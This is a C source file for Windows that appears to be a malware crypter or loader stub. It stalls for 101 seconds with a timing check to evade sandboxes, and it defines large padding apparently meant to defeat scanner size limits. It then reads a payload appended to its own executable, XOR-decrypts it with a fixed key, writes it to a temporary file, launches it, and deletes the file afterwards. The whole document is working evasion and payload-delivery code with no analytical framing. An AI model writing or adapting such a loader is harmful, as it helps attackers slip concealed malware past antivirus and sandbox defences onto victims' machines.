#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define XOR_KEY 0xAA
#define ORIGINAL_PAYLOAD_SIZE 110556160
#define PADDING_SIZE (101 * 1024 * 1024)

int main(int argc, char *argv[]) {
    
    int counter = 0;
    for (int i = 0; i < 100001; i++) {
        counter++;
    }

    // Sleep 101 sec
    DWORD start = GetTickCount();
    Sleep(101000);
    DWORD end = GetTickCount();
    if (end - start < 101000) {
        printf("Not enough time passed. Aborting.\n");
        return 1;
    }

    FILE *self = fopen(argv[0], "rb");
    if (!self) {
        perror("Error opening input file in self");
        return 1;
    }

    // Get file size
    fseek(self, 0, SEEK_END);
    long fileSize = ftell(self);
    long payloadOffset = fileSize - ORIGINAL_PAYLOAD_SIZE;
    if (payloadOffset <= 0) {
        printf("Payload offset is not valid.\n");
        fclose(self);
        return 1;
    }

    // Allocate memory for the decrypted payload
    LPVOID buffer = VirtualAlloc(NULL, ORIGINAL_PAYLOAD_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(self);
        return 1;
    }

    // Seek to the payload position
    fseek(self, payloadOffset, SEEK_SET);
    
    // Read and decrypt the payload directly into memory
    unsigned char *byteBuffer = (unsigned char *)buffer;
    for (long i = 0; i < ORIGINAL_PAYLOAD_SIZE; i++) {
        int byte = fgetc(self);
        if (byte == EOF) break;
        byteBuffer[i] = byte ^ XOR_KEY;
    }
    
    fclose(self);
    printf("Decryption complete in memory.\n");

    // Create a temporary file in memory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFileName[MAX_PATH];
    GetTempFileNameA(tempPath, "TMP", 0, tempFileName);

    // Create the process with the memory-mapped executable
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Write the decrypted data to the temp file
    FILE *tempFile = fopen(tempFileName, "wb");
    if (!tempFile) {
        perror("Error creating temporary file");
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }
    
    fwrite(buffer, 1, ORIGINAL_PAYLOAD_SIZE, tempFile);
    fclose(tempFile);
    
    // Execute the process
    if (!CreateProcessA(
        tempFileName, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL,
        &si, &pi)) {
        perror("Error creating process");
        DeleteFileA(tempFileName);
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for process to complete
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteFileA(tempFileName);  // Delete the temporary file
    VirtualFree(buffer, 0, MEM_RELEASE);

    return 0;
}
